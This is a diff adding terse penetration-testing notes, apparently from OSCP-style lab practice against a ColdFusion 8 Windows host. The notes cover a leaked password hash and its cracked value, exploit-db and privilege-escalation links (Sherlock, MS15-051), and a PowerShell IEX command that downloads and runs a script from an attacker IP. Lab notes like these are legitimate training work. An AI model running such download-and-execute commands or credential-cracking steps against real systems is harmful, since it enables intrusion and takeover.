@@ -1,0 +1,28 @@
+#Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP \n password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=true 
+
+https://crackstation.net/
+
+happyday
+
+https://www.exploit-db.com/exploits/14641
+
+
+scheduled tasks
+
+https://github.com/ernestang98/oscp/tree/master/public-subnet/Mike_10.11.1.10
+
+
+need to find directory, do enumeration of coldfusion :)
+
+C:\ColdFusion8\wwwroot iirc
+
+
+/c powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/ipw.ps1')" 
+
+
+sherlock :)
+
+https://vk9-sec.com/sherlock-find-missing-windows-patches-for-local-privilege-escalation/
+
+
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
